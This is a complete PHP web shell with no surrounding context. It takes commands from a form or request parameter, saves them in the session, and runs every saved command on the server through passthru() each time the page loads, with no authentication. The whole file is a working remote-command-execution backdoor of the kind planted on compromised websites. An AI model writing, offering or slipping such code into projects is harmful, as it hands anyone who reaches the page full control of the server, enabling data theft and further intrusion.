<?php
session_start();

// Initialize history if not exists
if (!isset($_SESSION['cmd_history'])) {
    $_SESSION['cmd_history'] = array();
}

// Add new command to history
if(isset($_REQUEST['cmd']) && !empty($_REQUEST['cmd'])){
    $cmd = $_REQUEST['cmd'];
    $_SESSION['cmd_history'][] = $cmd;
}

// Show command history and results
echo "<div style='background:#000;color:#0F0;padding:10px;font-family:monospace;margin-bottom:20px;'>";
foreach ($_SESSION['cmd_history'] as $index => $hist_cmd) {
    echo "<div style='margin:5px 0;'>";
    echo "$ " . htmlspecialchars($hist_cmd) . "\n";
    echo "<pre style='margin:5px 0 10px 20px;'>";
    passthru($hist_cmd);
    echo "</pre>";
    echo "</div>";
}
echo "</div>";
?>

<form method="post" style="margin:10px;">
    <input type="text" name="cmd" size="50" style="padding:5px;" autofocus>
    <input type="submit" value="Execute" style="padding:5px;">
</form>

<style>
body { background:#1a1a1a; color:#fff; }
input[type="text"] { background:#333; color:#fff; border:1px solid #666; }
input[type="submit"] { background:#444; color:#fff; border:1px solid #666; cursor:pointer; }
input[type="submit"]:hover { background:#555; }
</style>